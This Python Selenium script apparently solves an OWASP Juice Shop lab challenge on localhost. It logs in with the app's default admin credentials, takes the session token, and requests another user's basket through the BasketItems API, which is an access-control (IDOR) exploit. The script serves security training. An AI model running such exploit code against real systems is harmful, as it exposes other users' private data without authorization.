from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import time
import requests
import json

# TODO: add routing to score-board to check each achievement after finishing


def main():
    # Initialize the WebDriver
    driver = webdriver.Chrome()  # Use the browser of your choice (e.g., Firefox, Edge)

    # Open the webpage
    driver.get("http://localhost:3000/#/")  # Change this to your local or deployed URL

    # Wait for and dismiss the overlay
    try:
        dismissBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "mat-focus-indicator.mat-raised-button.mat-warn"))
        )
        dismissBtn.click()
        print("Overlay dismissed.")
    except Exception as e:
        print(f"Could not dismiss the overlay: {e}")

    # Any user can be used to log in for this one
    login_user(driver)

    # Capture the authorization token after login
    token = acquire_token(driver)

    # Ensure token exists
    if token:
        print("Successfully acquired token.")
        
        # Retrieve the basket ID of the logged-in user
        basketid = acquire_basket_id(driver)

        # Change this to the other user's basket ID you want to view
        other_basketid = "2"  # Example: target another user's basket by their basket ID, 2 should work

        if basketid and other_basketid:
            # View the other user's basket
            view_other_basket(token, other_basketid)
        
    else:
        print("Failed to capture the auth token.")

    # Close the browser
    input("Press Enter to close the browser...")
    driver.quit()


def login_user(driver):
    # Login as a normal user
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, "navbarAccount"))
    ).click()

    # Navigate to the login page
    WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
    ).click()

    # Enter email & password
    emailField = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, "email"))
    )
    emailField.send_keys("admin@juice-sh.op")

    passwordField = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, "password"))
    )
    passwordField.send_keys("admin123")

    # Send email and password to login
    passwordField.send_keys(Keys.RETURN)  

    time.sleep(2)


def acquire_token(driver):
    cookies = driver.get_cookies()
    for cookie in cookies:
        if cookie['name'] == 'token':
            return cookie['value']
    return None


def acquire_basket_id(driver):
    # Retrieve the basket ID from sessionStorage
    basket_id = driver.execute_script("return sessionStorage.getItem('bid');")
    
    if not basket_id:
        print("Basket ID could not be found in sessionStorage.")
    else:
        print(f"Basket ID found (our logged in accounts ID): {basket_id}")
    
    return basket_id


def view_other_basket(token, other_users_basketid):
    # API endpoint to get the contents of a basket
    url = f"http://localhost:3000/api/BasketItems"  # TODO: localhost should work for lab right?

    # Headers with authorization token
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # Make a GET request to view another user's basket by passing their basket ID as a parameter
    response = requests.get(url, headers=headers, params={
        "BasketId": other_users_basketid
    })

    if response.status_code == 200:
        try:
            basket_content = response.json()  # Parse the response as JSON
            print(f"Basket Content for other user's Basketid {other_users_basketid}:", json.dumps(basket_content, indent=4))
        
            print()
            print("The above basket contents are that of another user, that being user ID 2 when") 
            print("the admin account we're logged in as is basket ID 1.")
            print("Viewing the others users basket here allows us to get what should be private information,")
            print("and a real world example could be used to mine and store user data which could then be sold") 
            print("or used in some other unwanted manor.")
            print()
        
        except json.JSONDecodeError:
            print("Failed to decode basket content response as JSON.")
    else:
        print(f"Error: {response.status_code}, {response.text}")


# Entry point to run the script
if __name__ == "__main__":
    main()
